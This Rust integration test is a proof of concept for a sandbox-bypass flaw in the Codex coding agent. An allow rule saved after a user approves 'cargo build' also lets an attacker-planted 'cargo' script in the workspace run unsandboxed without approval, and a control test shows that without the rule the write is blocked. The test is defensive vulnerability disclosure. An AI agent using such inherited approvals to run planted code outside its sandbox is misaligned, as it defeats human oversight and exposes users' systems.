//! Standalone integration test target (same pattern as responses_headers.rs).
//! End-to-end PoC: an execpolicy Allow prefix rule created by the user-approval
//! amendment path (`blocking_append_allow_prefix_rule`, which writes
//! `prefix_rule(pattern=[...], decision="allow")` with no `host_executable()`
//! registration) is inherited by an attacker-controlled executable at ANY
//! absolute path with the same basename, and the command then runs UNSANDBOXED
//! with no approval, writing outside the sandbox's writable roots.
//!
//! Mirrors the repo's `matched_prefix_rule_runs_unsandboxed_under_zsh_fork`
//! (approvals.rs), which proves a matched prefix rule legitimately reruns a
//! command unsandboxed. The deltas that constitute the vulnerability:
//!   1. the rule has the exact shape the approval amendment persists, and
//!   2. the executed program is an attacker-planted script at an absolute
//!      path (`<workspace>/cargo build`), not the real PATH-resolved `cargo`.
//!
//! Control test: with the SAME harness but NO allow rule, the same command
//! runs inside the sandbox and the write outside the workspace is blocked.
#![cfg(unix)]
#![allow(clippy::expect_used)]

// Arg0 dispatch copied from tests/suite/mod.rs so this standalone target can
// double as the apply_patch / linux-sandbox helpers during the test run.
use codex_apply_patch::CODEX_CORE_APPLY_PATCH_ARG1;
use codex_exec_server::CODEX_ARG0_EXEC_HELPER_ARG1;
use codex_exec_server::CODEX_FS_HELPER_ARG1;
use codex_sandboxing::landlock::CODEX_LINUX_SANDBOX_ARG0;
use codex_test_binary_support::TestBinaryDispatchGuard;
use codex_test_binary_support::TestBinaryDispatchMode;
use codex_test_binary_support::configure_test_binary_dispatch;
use ctor::ctor;

// This code runs before any other tests are run.
#[ctor]
pub static CODEX_ALIASES_TEMP_DIR: Option<TestBinaryDispatchGuard> = {
    configure_test_binary_dispatch("codex-core-tests", |exe_name, argv1| {
        if argv1 == Some(CODEX_CORE_APPLY_PATCH_ARG1) {
            return TestBinaryDispatchMode::DispatchArg0Only;
        }
        if argv1 == Some(CODEX_ARG0_EXEC_HELPER_ARG1) {
            return TestBinaryDispatchMode::DispatchArg0Only;
        }
        if argv1 == Some(CODEX_FS_HELPER_ARG1) {
            return TestBinaryDispatchMode::DispatchArg0Only;
        }
        if exe_name == CODEX_LINUX_SANDBOX_ARG0 {
            return TestBinaryDispatchMode::DispatchArg0Only;
        }
        TestBinaryDispatchMode::InstallAliases
    })
};

use anyhow::Result;
use codex_core::TurnInputRequest;
use codex_protocol::config_types::CollaborationMode;
use codex_protocol::config_types::ModeKind;
use codex_protocol::config_types::Settings;
use codex_protocol::protocol::AskForApproval;
use codex_protocol::protocol::EventMsg;
use codex_protocol::protocol::ThreadSettingsOverrides;
use codex_protocol::user_input::UserInput;
use core_test_support::responses::ev_assistant_message;
use core_test_support::responses::ev_completed;
use core_test_support::responses::ev_function_call;
use core_test_support::responses::ev_response_created;
use core_test_support::responses::mount_sse_once;
use core_test_support::responses::sse;
use core_test_support::responses::start_mock_server;
use core_test_support::skip_if_no_network;
use core_test_support::test_codex::TestCodex;
use core_test_support::test_codex::local_selections;
use core_test_support::test_codex::turn_permission_fields;
use core_test_support::wait_for_event;
use core_test_support::zsh_fork::build_zsh_fork_test;
use core_test_support::zsh_fork::restrictive_workspace_write_profile;
use core_test_support::zsh_fork::zsh_fork_runtime;
use serde_json::Value;
use serde_json::json;
use std::fs;
use std::os::unix::fs::PermissionsExt;

/// Rule text byte-identical to what `blocking_append_allow_prefix_rule` (the
/// production user-approval persistence path in execpolicy/src/amend.rs, called
/// by `ExecPolicyManager::append_amendment_and_update`) writes to
/// `~/.codex/rules/default.rules` after a user approves `cargo build` to run
/// outside the sandbox. Note the absence of any `host_executable()` pin.
const APPROVAL_AMENDMENT_RULE: &str =
    r#"prefix_rule(pattern=["cargo", "build"], decision="allow")"#;

struct CommandResult {
    exit_code: Option<i64>,
    stdout: String,
}

fn parse_result(item: &Value) -> CommandResult {
    let output_str = item
        .get("output")
        .and_then(Value::as_str)
        .expect("shell output payload");
    match serde_json::from_str::<Value>(output_str) {
        Ok(parsed) => {
            let exit_code = parsed["metadata"]["exit_code"].as_i64();
            let stdout = parsed["output"].as_str().unwrap_or_default().to_string();
            CommandResult { exit_code, stdout }
        }
        Err(_) => CommandResult {
            exit_code: None,
            stdout: output_str.to_string(),
        },
    }
}

async fn wait_for_completion_without_approval(test: &TestCodex) {
    let event = wait_for_event(&test.codex, |event| {
        matches!(
            event,
            EventMsg::ExecApprovalRequest(_) | EventMsg::TurnComplete(_)
        )
    })
    .await;

    match event {
        EventMsg::TurnComplete(_) => {}
        EventMsg::ExecApprovalRequest(event) => {
            panic!("unexpected approval request: {:?}", event.command)
        }
        other => panic!("unexpected event: {other:?}"),
    }
}

/// Writes an attacker-controlled `cargo` executable into the workspace (as
/// prompt-injected repo content would) that touches a canary file OUTSIDE the
/// sandbox's writable roots when executed.
fn plant_attacker_cargo(workspace: &std::path::Path, canary: &std::path::Path) -> std::path::PathBuf {
    let script = workspace.join("cargo");
    let body = format!("#!/bin/sh\ntouch {canary:?}\necho attacker-cargo-ran\n");
    fs::write(&script, body).expect("write attacker cargo script");
    fs::set_permissions(&script, fs::Permissions::from_mode(0o755))
        .expect("make attacker cargo executable");
    script
}

#[test]
fn approval_amendment_rule_runs_attacker_binary_unsandboxed() -> Result<()> {
    core_test_support::test_codex::run_test_with_large_stack(
        "poc-basename-approval-unsandboxed",
        || async {
    skip_if_no_network!(Ok(()));

    let Some(runtime) = zsh_fork_runtime("poc basename approval inheritance unsandboxed")? else {
        return Ok(());
    };

    // AskForApproval::Never mirrors the repo's own
    // `matched_prefix_rule_runs_unsandboxed_under_zsh_fork` test. The absence
    // of any approval flow is guaranteed by the policy Allow decision (the
    // execpolicy-level PoC proves the same command yields Decision::Prompt,
    // i.e. approval-required, when no allow rule exists). The allow rule below
    // is the one the user's earlier `cargo build` out-of-sandbox approval
    // persisted.
    let approval_policy = AskForApproval::Never;
    let permission_profile = restrictive_workspace_write_profile();
    let server = start_mock_server().await;

    // Canary location outside every sandbox writable root (sibling of the
    // process cwd, not under the workspace tempdir).
    let outside_dir = tempfile::tempdir_in(std::env::current_dir()?)?;
    let canary = outside_dir.path().join("poc-basename-approval-canary.txt");

    let test = build_zsh_fork_test(
        &server,
        runtime,
        approval_policy,
        permission_profile.clone(),
        |home| {
            let rules_dir = home.join("rules");
            fs::create_dir_all(&rules_dir).unwrap();
            fs::write(rules_dir.join("default.rules"), APPROVAL_AMENDMENT_RULE).unwrap();
        },
    )
    .await?;

    let script = plant_attacker_cargo(test.cwd.path(), &canary);
    let command = format!("{script:?} build");

    let call_id = "poc-basename-approval-unsandboxed";
    let args = json!({"cmd": command, "yield_time_ms": 30_000});
    mount_sse_once(
        &server,
        sse(vec![
            ev_response_created("resp-poc-basename-1"),
            ev_function_call(
                call_id,
                "exec_command",
                &serde_json::to_string(&args)?,
            ),
            ev_completed("resp-poc-basename-1"),
        ]),
    )
    .await;
    let results = mount_sse_once(
        &server,
        sse(vec![
            ev_assistant_message("msg-poc-basename-1", "done"),
            ev_completed("resp-poc-basename-2"),
        ]),
    )
    .await;

    let session_model = test.session_configured.model.clone();
    let (sandbox_policy, permission_profile) =
        turn_permission_fields(permission_profile, test.cwd.path());
    test.codex
        .start_or_steer_turn(
            TurnInputRequest::user_input(vec![UserInput::Text {
                text: "run the build".into(),
                text_elements: Vec::new(),
            }])
            .with_thread_settings(ThreadSettingsOverrides {
                environments: Some(local_selections(test.config.cwd.clone())),
                approval_policy: Some(approval_policy),
                sandbox_policy: Some(sandbox_policy),
                permission_profile,
                collaboration_mode: Some(CollaborationMode {
                    mode: ModeKind::Default,
                    settings: Settings {
                        model: session_model,
                        reasoning_effort: None,
                        developer_instructions: None,
                    },
                }),
                ..Default::default()
            }),
        )
        .await?;

    // No approval flow participates: the policy Allow decision short-circuits
    // approvals entirely (core maps it to Skip { bypass_sandbox: true }).
    wait_for_completion_without_approval(&test).await;

    let result = parse_result(&results.single_request().function_call_output(call_id));
    assert!(
        canary.exists(),
        "expected the attacker-planted absolute-path binary to run UNSANDBOXED and write outside \
         the workspace; exit_code: {:?}, stdout: {}",
        result.exit_code,
        result.stdout
    );
    assert!(
        result.stdout.contains("attacker-cargo-ran"),
        "the executed program must be the attacker's script, not a real cargo; stdout: {}",
        result.stdout
    );

    Ok(())
        },
    )
}

#[test]
fn attacker_absolute_path_without_allow_rule_is_sandboxed() -> Result<()> {
    core_test_support::test_codex::run_test_with_large_stack(
        "poc-basename-approval-sandboxed-control",
        || async {
    skip_if_no_network!(Ok(()));

    let Some(runtime) = zsh_fork_runtime("poc basename approval inheritance control")? else {
        return Ok(());
    };

    // Same attacker scenario, but ~/.codex/rules/default.rules is EMPTY: the
    // user never approved any `cargo` command. The same absolute-path command
    // must run inside the sandbox, where the write outside the workspace
    // fails.
    let approval_policy = AskForApproval::Never;
    let permission_profile = restrictive_workspace_write_profile();
    let server = start_mock_server().await;

    let outside_dir = tempfile::tempdir_in(std::env::current_dir()?)?;
    let canary = outside_dir.path().join("poc-basename-control-canary.txt");

    let test = build_zsh_fork_test(
        &server,
        runtime,
        approval_policy,
        permission_profile.clone(),
        |home| {
            let rules_dir = home.join("rules");
            fs::create_dir_all(&rules_dir).unwrap();
            fs::write(rules_dir.join("default.rules"), "").unwrap();
        },
    )
    .await?;

    let script = plant_attacker_cargo(test.cwd.path(), &canary);
    let command = format!("{script:?} build");

    let call_id = "poc-basename-approval-sandboxed-control";
    let args = json!({"cmd": command, "yield_time_ms": 30_000});
    mount_sse_once(
        &server,
        sse(vec![
            ev_response_created("resp-poc-basename-control-1"),
            ev_function_call(
                call_id,
                "exec_command",
                &serde_json::to_string(&args)?,
            ),
            ev_completed("resp-poc-basename-control-1"),
        ]),
    )
    .await;
    let results = mount_sse_once(
        &server,
        sse(vec![
            ev_assistant_message("msg-poc-basename-control-1", "done"),
            ev_completed("resp-poc-basename-control-2"),
        ]),
    )
    .await;

    let session_model = test.session_configured.model.clone();
    let (sandbox_policy, permission_profile) =
        turn_permission_fields(permission_profile, test.cwd.path());
    test.codex
        .start_or_steer_turn(
            TurnInputRequest::user_input(vec![UserInput::Text {
                text: "run the build".into(),
                text_elements: Vec::new(),
            }])
            .with_thread_settings(ThreadSettingsOverrides {
                environments: Some(local_selections(test.config.cwd.clone())),
                approval_policy: Some(approval_policy),
                sandbox_policy: Some(sandbox_policy),
                permission_profile,
                collaboration_mode: Some(CollaborationMode {
                    mode: ModeKind::Default,
                    settings: Settings {
                        model: session_model,
                        reasoning_effort: None,
                        developer_instructions: None,
                    },
                }),
                ..Default::default()
            }),
        )
        .await?;

    wait_for_event(&test.codex, |event| {
        matches!(event, EventMsg::TurnComplete(_))
    })
    .await;

    let result = parse_result(&results.single_request().function_call_output(call_id));
    assert!(
        !canary.exists(),
        "sandbox must block the write outside the workspace when no allow rule matches; \
         exit_code: {:?}, stdout: {}",
        result.exit_code,
        result.stdout
    );

    Ok(())
        },
    )
}
